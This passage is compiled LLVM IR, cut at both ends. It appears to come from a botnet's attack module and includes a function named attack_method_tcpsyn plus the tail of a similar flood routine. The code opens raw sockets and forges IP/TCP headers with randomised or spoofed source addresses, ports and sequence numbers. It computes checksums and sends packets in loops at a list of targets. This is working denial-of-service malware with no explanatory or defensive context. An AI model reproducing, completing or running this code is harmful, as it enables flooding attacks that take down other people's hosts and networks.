  %139 = call zeroext i16 @htons(i16 zeroext %49) #8
  %140 = getelementptr inbounds i8, i8* %133, i64 2
  %141 = bitcast i8* %140 to i16*
  store i16 %139, i16* %141, align 2
  %142 = call zeroext i16 @htons(i16 zeroext %12) #8
  %143 = getelementptr inbounds i8, i8* %133, i64 4
  %144 = bitcast i8* %143 to i16*
  store i16 %142, i16* %144, align 4
  %145 = getelementptr inbounds i8, i8* %133, i64 8
  store i8 %14, i8* %145, align 4
  %146 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %147 = getelementptr inbounds i8, i8* %133, i64 6
  %148 = bitcast i8* %147 to i16*
  store i16 %146, i16* %148, align 2
  %149 = getelementptr inbounds i8, i8* %133, i64 9
  store i8 6, i8* %149, align 1
  %150 = getelementptr inbounds i8, i8* %133, i64 12
  %151 = bitcast i8* %150 to i32*
  store i32 %39, i32* %151, align 4
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %134, i32 1
  %153 = load i32, i32* %152, align 4
  %154 = getelementptr inbounds i8, i8* %133, i64 16
  %155 = bitcast i8* %154 to i32*
  store i32 %153, i32* %155, align 4
  %156 = call zeroext i16 @htons(i16 zeroext %18) #8
  %157 = bitcast i8* %136 to i16*
  store i16 %156, i16* %157, align 4
  %158 = call zeroext i16 @htons(i16 zeroext %20) #8
  %159 = getelementptr inbounds i8, i8* %133, i64 22
  %160 = bitcast i8* %159 to i16*
  store i16 %158, i16* %160, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %51) #8
  %162 = zext i16 %161 to i32
  %163 = getelementptr inbounds i8, i8* %133, i64 24
  %164 = bitcast i8* %163 to i32*
  store i32 %162, i32* %164, align 4
  %165 = getelementptr inbounds i8, i8* %133, i64 32
  %166 = bitcast i8* %165 to i16*
  store i16 %69, i16* %166, align 4
  %167 = call i32 @rand() #7
  %168 = srem i32 %167, 65535
  %169 = trunc i32 %168 to i16
  %170 = getelementptr inbounds i8, i8* %133, i64 34
  %171 = bitcast i8* %170 to i16*
  store i16 %169, i16* %171, align 2
  br i1 %70, label %175, label %172

; <label>:172:                                    ; preds = %.lr.ph129.split
  %173 = load i16, i16* %166, align 4
  %174 = or i16 %173, 2048
  store i16 %174, i16* %166, align 4
  br label %175

; <label>:175:                                    ; preds = %.lr.ph129.split, %172
  call void @rand_str(i8* nonnull %137, i32 %35) #7
  %176 = load i32, i32* %5, align 4
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %5, align 4
  %178 = icmp slt i32 %177, %46
  br i1 %178, label %.lr.ph129.split, label %.preheader.loopexit137

.loopexit.loopexit:                               ; preds = %235
  br label %.loopexit.backedge

.loopexit.loopexit136:                            ; preds = %309
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit136
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %117, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %235
  %storemerge121128.us = phi i32 [ %254, %235 ], [ 0, %.lr.ph.split.us.preheader ]
  %179 = sext i32 %storemerge121128.us to i64
  %180 = getelementptr inbounds i8*, i8** %8, i64 %179
  %181 = load i8*, i8** %180, align 8
  %182 = bitcast i8* %181 to %struct.iphdr*
  %183 = getelementptr inbounds i8, i8* %181, i64 20
  %184 = getelementptr inbounds i8, i8* %181, i64 40
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %179, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = icmp ult i8 %186, 32
  br i1 %187, label %188, label %203

; <label>:188:                                    ; preds = %.lr.ph.split.us
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %179, i32 1
  %190 = load i32, i32* %189, align 4
  %191 = call i32 @ntohl(i32 %190) #8
  %192 = call i32 @rand_next() #7
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %194, i32 2
  %196 = load i8, i8* %195, align 4
  %197 = zext i8 %196 to i32
  %198 = lshr i32 %192, %197
  %199 = add i32 %198, %191
  %200 = call i32 @htonl(i32 %199) #8
  %201 = getelementptr inbounds i8, i8* %181, i64 16
  %202 = bitcast i8* %201 to i32*
  store i32 %200, i32* %202, align 4
  br label %203

; <label>:203:                                    ; preds = %.lr.ph.split.us, %188
  %204 = call i32 @rand_next() #7
  %205 = getelementptr inbounds i8, i8* %181, i64 12
  %206 = bitcast i8* %205 to i32*
  store i32 %204, i32* %206, align 4
  br i1 %119, label %207, label %212

; <label>:207:                                    ; preds = %203
  %208 = call i32 @rand_next() #7
  %209 = trunc i32 %208 to i16
  %210 = getelementptr inbounds i8, i8* %181, i64 4
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 4
  br label %212

; <label>:212:                                    ; preds = %207, %203
  br i1 %121, label %213, label %217

; <label>:213:                                    ; preds = %212
  %214 = call i32 @rand_next() #7
  %215 = trunc i32 %214 to i16
  %216 = bitcast i8* %183 to i16*
  store i16 %215, i16* %216, align 4
  br label %217

; <label>:217:                                    ; preds = %213, %212
  br i1 %123, label %218, label %223

; <label>:218:                                    ; preds = %217
  %219 = call i32 @rand_next() #7
  %220 = trunc i32 %219 to i16
  %221 = getelementptr inbounds i8, i8* %181, i64 22
  %222 = bitcast i8* %221 to i16*
  store i16 %220, i16* %222, align 2
  br label %223

; <label>:223:                                    ; preds = %218, %217
  br i1 %124, label %224, label %228

; <label>:224:                                    ; preds = %223
  %225 = call i32 @rand_next() #7
  %226 = getelementptr inbounds i8, i8* %181, i64 24
  %227 = bitcast i8* %226 to i32*
  store i32 %225, i32* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %224, %223
  br i1 %125, label %229, label %233

; <label>:229:                                    ; preds = %228
  %230 = call i32 @rand_next() #7
  %231 = getelementptr inbounds i8, i8* %181, i64 28
  %232 = bitcast i8* %231 to i32*
  store i32 %230, i32* %232, align 4
  br label %233

; <label>:233:                                    ; preds = %229, %228
  br i1 %126, label %235, label %234

; <label>:234:                                    ; preds = %233
  call void @rand_str(i8* nonnull %184, i32 %35) #7
  br label %235

; <label>:235:                                    ; preds = %234, %233
  %236 = getelementptr inbounds i8, i8* %181, i64 10
  %237 = bitcast i8* %236 to i16*
  store i16 0, i16* %237, align 2
  %238 = bitcast i8* %181 to i16*
  %239 = call zeroext i16 @checksum_generic(i16* %238, i32 20) #7
  store i16 %239, i16* %237, align 2
  %240 = getelementptr inbounds i8, i8* %181, i64 36
  %241 = bitcast i8* %240 to i16*
  store i16 0, i16* %241, align 4
  %242 = call zeroext i16 @htons(i16 zeroext %129) #8
  %243 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %182, i8* nonnull %183, i16 zeroext %242, i32 %130) #7
  store i16 %243, i16* %241, align 4
  %244 = getelementptr inbounds i8, i8* %181, i64 22
  %245 = bitcast i8* %244 to i16*
  %246 = load i16, i16* %245, align 2
  %247 = load i32, i32* %5, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %248, i32 0, i32 1
  store i16 %246, i16* %249, align 2
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %248, i32 0
  %251 = bitcast %struct.sockaddr_in* %250 to %struct.sockaddr*
  %252 = call i64 @sendto(i32 %40, i8* nonnull %181, i64 %131, i32 16384, %struct.sockaddr* %251, i32 16) #7
  %253 = load i32, i32* %5, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %5, align 4
  %255 = icmp slt i32 %254, %46
  br i1 %255, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %309
  %storemerge121128 = phi i32 [ %328, %309 ], [ 0, %.lr.ph.split.preheader ]
  %256 = sext i32 %storemerge121128 to i64
  %257 = getelementptr inbounds i8*, i8** %8, i64 %256
  %258 = load i8*, i8** %257, align 8
  %259 = bitcast i8* %258 to %struct.iphdr*
  %260 = getelementptr inbounds i8, i8* %258, i64 20
  %261 = getelementptr inbounds i8, i8* %258, i64 40
  %262 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %256, i32 2
  %263 = load i8, i8* %262, align 4
  %264 = icmp ult i8 %263, 32
  br i1 %264, label %265, label %280

; <label>:265:                                    ; preds = %.lr.ph.split
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %256, i32 1
  %267 = load i32, i32* %266, align 4
  %268 = call i32 @ntohl(i32 %267) #8
  %269 = call i32 @rand_next() #7
  %270 = load i32, i32* %5, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 2
  %273 = load i8, i8* %272, align 4
  %274 = zext i8 %273 to i32
  %275 = lshr i32 %269, %274
  %276 = add i32 %275, %268
  %277 = call i32 @htonl(i32 %276) #8
  %278 = getelementptr inbounds i8, i8* %258, i64 16
  %279 = bitcast i8* %278 to i32*
  store i32 %277, i32* %279, align 4
  br label %280

; <label>:280:                                    ; preds = %.lr.ph.split, %265
  br i1 %119, label %281, label %286

; <label>:281:                                    ; preds = %280
  %282 = call i32 @rand_next() #7
  %283 = trunc i32 %282 to i16
  %284 = getelementptr inbounds i8, i8* %258, i64 4
  %285 = bitcast i8* %284 to i16*
  store i16 %283, i16* %285, align 4
  br label %286

; <label>:286:                                    ; preds = %281, %280
  br i1 %121, label %287, label %291

; <label>:287:                                    ; preds = %286
  %288 = call i32 @rand_next() #7
  %289 = trunc i32 %288 to i16
  %290 = bitcast i8* %260 to i16*
  store i16 %289, i16* %290, align 4
  br label %291

; <label>:291:                                    ; preds = %287, %286
  br i1 %123, label %292, label %297

; <label>:292:                                    ; preds = %291
  %293 = call i32 @rand_next() #7
  %294 = trunc i32 %293 to i16
  %295 = getelementptr inbounds i8, i8* %258, i64 22
  %296 = bitcast i8* %295 to i16*
  store i16 %294, i16* %296, align 2
  br label %297

; <label>:297:                                    ; preds = %292, %291
  br i1 %124, label %298, label %302

; <label>:298:                                    ; preds = %297
  %299 = call i32 @rand_next() #7
  %300 = getelementptr inbounds i8, i8* %258, i64 24
  %301 = bitcast i8* %300 to i32*
  store i32 %299, i32* %301, align 4
  br label %302

; <label>:302:                                    ; preds = %298, %297
  br i1 %125, label %303, label %307

; <label>:303:                                    ; preds = %302
  %304 = call i32 @rand_next() #7
  %305 = getelementptr inbounds i8, i8* %258, i64 28
  %306 = bitcast i8* %305 to i32*
  store i32 %304, i32* %306, align 4
  br label %307

; <label>:307:                                    ; preds = %303, %302
  br i1 %126, label %309, label %308

; <label>:308:                                    ; preds = %307
  call void @rand_str(i8* %261, i32 %35) #7
  br label %309

; <label>:309:                                    ; preds = %307, %308
  %310 = getelementptr inbounds i8, i8* %258, i64 10
  %311 = bitcast i8* %310 to i16*
  store i16 0, i16* %311, align 2
  %312 = bitcast i8* %258 to i16*
  %313 = call zeroext i16 @checksum_generic(i16* %312, i32 20) #7
  store i16 %313, i16* %311, align 2
  %314 = getelementptr inbounds i8, i8* %258, i64 36
  %315 = bitcast i8* %314 to i16*
  store i16 0, i16* %315, align 4
  %316 = call zeroext i16 @htons(i16 zeroext %129) #8
  %317 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %259, i8* %260, i16 zeroext %316, i32 %130) #7
  store i16 %317, i16* %315, align 4
  %318 = getelementptr inbounds i8, i8* %258, i64 22
  %319 = bitcast i8* %318 to i16*
  %320 = load i16, i16* %319, align 2
  %321 = load i32, i32* %5, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %322, i32 0, i32 1
  store i16 %320, i16* %323, align 2
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %322, i32 0
  %325 = bitcast %struct.sockaddr_in* %324 to %struct.sockaddr*
  %326 = call i64 @sendto(i32 %40, i8* %258, i64 %131, i32 16384, %struct.sockaddr* %325, i32 16) #7
  %327 = load i32, i32* %5, align 4
  %328 = add nsw i32 %327, 1
  store i32 %328, i32* %5, align 4
  %329 = icmp slt i32 %328, %46
  br i1 %329, label %.lr.ph.split, label %.loopexit.loopexit136

; <label>:330:                                    ; preds = %4, %115
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %349, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #7
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %121, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %65 = phi i32 [ %119, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8*, i8** %8, i64 %67
  store i8* %66, i8** %68, align 8
  %69 = getelementptr inbounds i8, i8* %66, i64 20
  %70 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %71 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %71, align 1
  %72 = call zeroext i16 @htons(i16 zeroext 60) #8
  %73 = getelementptr inbounds i8, i8* %66, i64 2
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  %75 = call zeroext i16 @htons(i16 zeroext %12) #8
  %76 = getelementptr inbounds i8, i8* %66, i64 4
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %78, align 4
  %79 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %79, align 1
  %80 = getelementptr inbounds i8, i8* %66, i64 12
  %81 = bitcast i8* %80 to i32*
  store i32 %36, i32* %81, align 4
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %67, i32 1
  %83 = load i32, i32* %82, align 4
  %84 = getelementptr inbounds i8, i8* %66, i64 16
  %85 = bitcast i8* %84 to i32*
  store i32 %83, i32* %85, align 4
  %86 = call zeroext i16 @htons(i16 zeroext %18) #8
  %87 = bitcast i8* %69 to i16*
  store i16 %86, i16* %87, align 4
  %88 = call zeroext i16 @htons(i16 zeroext %20) #8
  %89 = getelementptr inbounds i8, i8* %66, i64 22
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %46) #8
  %92 = zext i16 %91 to i32
  %93 = getelementptr inbounds i8, i8* %66, i64 24
  %94 = bitcast i8* %93 to i32*
  store i32 %92, i32* %94, align 4
  %95 = getelementptr inbounds i8, i8* %66, i64 32
  %96 = bitcast i8* %95 to i16*
  store i16 %64, i16* %96, align 4
  %97 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %70, align 1
  %98 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %97, align 1
  %99 = call i32 @rand_next() #7
  %100 = and i32 %99, 15
  %101 = add nuw nsw i32 %100, 1458
  %102 = trunc i32 %101 to i16
  %103 = call zeroext i16 @htons(i16 zeroext %102) #8
  %104 = bitcast i8* %98 to i16*
  store i16 %103, i16* %104, align 2
  %105 = getelementptr inbounds i8, i8* %66, i64 44
  %106 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %106, align 1
  %108 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %107, align 1
  %109 = getelementptr inbounds i8, i8* %66, i64 48
  store i8 10, i8* %108, align 1
  %110 = call i32 @rand_next() #7
  %111 = bitcast i8* %109 to i32*
  store i32 %110, i32* %111, align 4
  %112 = getelementptr inbounds i8, i8* %66, i64 52
  %113 = bitcast i8* %112 to i32*
  store i32 0, i32* %113, align 4
  %114 = getelementptr inbounds i8, i8* %66, i64 56
  %115 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %114, align 1
  %116 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %115, align 1
  %117 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %116, align 1
  store i8 8, i8* %117, align 1
  %118 = load i32, i32* %5, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %5, align 4
  %120 = icmp slt i32 %119, %43
  br i1 %120, label %.lr.ph130.split.us, label %.preheader.loopexit

; <label>:121:                                    ; preds = %39
  %122 = call i32 @close(i32 %37) #7
  br label %349

.preheader.loopexit:                              ; preds = %.lr.ph130.split.us
  br label %.preheader

.preheader.loopexit138:                           ; preds = %.lr.ph130.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit138, %.preheader.loopexit, %.preheader128
  %123 = icmp eq i32 %36, -1
  %124 = and i32 %11, 65535
  %125 = icmp eq i32 %124, 65535
  %126 = and i32 %17, 65535
  %127 = icmp eq i32 %126, 65535
  %128 = and i32 %19, 65535
  %129 = icmp eq i32 %128, 65535
  %130 = icmp eq i32 %21, 65535
  %131 = icmp eq i32 %22, 65535
  %132 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %133 = phi i32 [ %190, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %134 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %135 = sext i32 %133 to i64
  %136 = getelementptr inbounds i8*, i8** %8, i64 %135
  store i8* %134, i8** %136, align 8
  %137 = getelementptr inbounds i8, i8* %134, i64 20
  %138 = getelementptr inbounds i8, i8* %134, i64 40
  store i8 69, i8* %134, align 4
  %139 = getelementptr inbounds i8, i8* %134, i64 1
  store i8 %10, i8* %139, align 1
  %140 = call zeroext i16 @htons(i16 zeroext 60) #8
  %141 = getelementptr inbounds i8, i8* %134, i64 2
  %142 = bitcast i8* %141 to i16*
  store i16 %140, i16* %142, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %12) #8
  %144 = getelementptr inbounds i8, i8* %134, i64 4
  %145 = bitcast i8* %144 to i16*
  store i16 %143, i16* %145, align 4
  %146 = getelementptr inbounds i8, i8* %134, i64 8
  store i8 %14, i8* %146, align 4
  %147 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %148 = getelementptr inbounds i8, i8* %134, i64 6
  %149 = bitcast i8* %148 to i16*
  store i16 %147, i16* %149, align 2
  %150 = getelementptr inbounds i8, i8* %134, i64 9
  store i8 6, i8* %150, align 1
  %151 = getelementptr inbounds i8, i8* %134, i64 12
  %152 = bitcast i8* %151 to i32*
  store i32 %36, i32* %152, align 4
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %135, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = getelementptr inbounds i8, i8* %134, i64 16
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = call zeroext i16 @htons(i16 zeroext %18) #8
  %158 = bitcast i8* %137 to i16*
  store i16 %157, i16* %158, align 4
  %159 = call zeroext i16 @htons(i16 zeroext %20) #8
  %160 = getelementptr inbounds i8, i8* %134, i64 22
  %161 = bitcast i8* %160 to i16*
  store i16 %159, i16* %161, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %46) #8
  %163 = zext i16 %162 to i32
  %164 = getelementptr inbounds i8, i8* %134, i64 24
  %165 = bitcast i8* %164 to i32*
  store i32 %163, i32* %165, align 4
  %166 = getelementptr inbounds i8, i8* %134, i64 32
  %167 = bitcast i8* %166 to i16*
  store i16 %64, i16* %167, align 4
  %168 = getelementptr inbounds i8, i8* %134, i64 41
  store i8 2, i8* %138, align 1
  %169 = getelementptr inbounds i8, i8* %134, i64 42
  store i8 4, i8* %168, align 1
  %170 = call i32 @rand_next() #7
  %171 = and i32 %170, 15
  %172 = add nuw nsw i32 %171, 1458
  %173 = trunc i32 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #8
  %175 = bitcast i8* %169 to i16*
  store i16 %174, i16* %175, align 2
  %176 = getelementptr inbounds i8, i8* %134, i64 44
  %177 = getelementptr inbounds i8, i8* %134, i64 45
  store i8 4, i8* %176, align 1
  %178 = getelementptr inbounds i8, i8* %134, i64 46
  store i8 2, i8* %177, align 1
  %179 = getelementptr inbounds i8, i8* %134, i64 47
  store i8 8, i8* %178, align 1
  %180 = getelementptr inbounds i8, i8* %134, i64 48
  store i8 10, i8* %179, align 1
  %181 = call i32 @rand_next() #7
  %182 = bitcast i8* %180 to i32*
  store i32 %181, i32* %182, align 4
  %183 = getelementptr inbounds i8, i8* %134, i64 52
  %184 = bitcast i8* %183 to i32*
  store i32 0, i32* %184, align 4
  %185 = getelementptr inbounds i8, i8* %134, i64 56
  %186 = getelementptr inbounds i8, i8* %134, i64 57
  store i8 1, i8* %185, align 1
  %187 = getelementptr inbounds i8, i8* %134, i64 58
  store i8 3, i8* %186, align 1
  %188 = getelementptr inbounds i8, i8* %134, i64 59
  store i8 3, i8* %187, align 1
  store i8 8, i8* %188, align 1
  %189 = load i32, i32* %5, align 4
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %5, align 4
  %191 = icmp slt i32 %190, %43
  br i1 %191, label %.lr.ph130.split, label %.preheader.loopexit138

.loopexit.loopexit:                               ; preds = %251
  br label %.loopexit.backedge

.loopexit.loopexit137:                            ; preds = %328
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit137
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %123, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %251
  %storemerge122129.us = phi i32 [ %270, %251 ], [ 0, %.lr.ph.split.us.preheader ]
  %192 = sext i32 %storemerge122129.us to i64
  %193 = getelementptr inbounds i8*, i8** %8, i64 %192
  %194 = load i8*, i8** %193, align 8
  %195 = bitcast i8* %194 to %struct.iphdr*
  %196 = getelementptr inbounds i8, i8* %194, i64 20
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %192, i32 2
  %198 = load i8, i8* %197, align 4
  %199 = icmp ult i8 %198, 32
  br i1 %199, label %200, label %215

; <label>:200:                                    ; preds = %.lr.ph.split.us
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %192, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = call i32 @ntohl(i32 %202) #8
  %204 = call i32 @rand_next() #7
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %206, i32 2
  %208 = load i8, i8* %207, align 4
  %209 = zext i8 %208 to i32
  %210 = lshr i32 %204, %209
  %211 = add i32 %210, %203
  %212 = call i32 @htonl(i32 %211) #8
  %213 = getelementptr inbounds i8, i8* %194, i64 16
  %214 = bitcast i8* %213 to i32*
  store i32 %212, i32* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %.lr.ph.split.us, %200
  %216 = call i32 @rand_next() #7
  %217 = getelementptr inbounds i8, i8* %194, i64 12
  %218 = bitcast i8* %217 to i32*
  store i32 %216, i32* %218, align 4
  br i1 %125, label %219, label %224

; <label>:219:                                    ; preds = %215
  %220 = call i32 @rand_next() #7
  %221 = trunc i32 %220 to i16
  %222 = getelementptr inbounds i8, i8* %194, i64 4
  %223 = bitcast i8* %222 to i16*
  store i16 %221, i16* %223, align 4
  br label %224

; <label>:224:                                    ; preds = %219, %215
  br i1 %127, label %225, label %229

; <label>:225:                                    ; preds = %224
  %226 = call i32 @rand_next() #7
  %227 = trunc i32 %226 to i16
  %228 = bitcast i8* %196 to i16*
  store i16 %227, i16* %228, align 4
  br label %229

; <label>:229:                                    ; preds = %225, %224
  br i1 %129, label %230, label %235

; <label>:230:                                    ; preds = %229
  %231 = call i32 @rand_next() #7
  %232 = trunc i32 %231 to i16
  %233 = getelementptr inbounds i8, i8* %194, i64 22
  %234 = bitcast i8* %233 to i16*
  store i16 %232, i16* %234, align 2
  br label %235

; <label>:235:                                    ; preds = %230, %229
  br i1 %130, label %236, label %240

; <label>:236:                                    ; preds = %235
  %237 = call i32 @rand_next() #7
  %238 = getelementptr inbounds i8, i8* %194, i64 24
  %239 = bitcast i8* %238 to i32*
  store i32 %237, i32* %239, align 4
  br label %240

; <label>:240:                                    ; preds = %236, %235
  br i1 %131, label %241, label %245

; <label>:241:                                    ; preds = %240
  %242 = call i32 @rand_next() #7
  %243 = getelementptr inbounds i8, i8* %194, i64 28
  %244 = bitcast i8* %243 to i32*
  store i32 %242, i32* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %241, %240
  br i1 %132, label %251, label %246

; <label>:246:                                    ; preds = %245
  %247 = call i32 @rand_next() #7
  %248 = trunc i32 %247 to i16
  %249 = getelementptr inbounds i8, i8* %194, i64 38
  %250 = bitcast i8* %249 to i16*
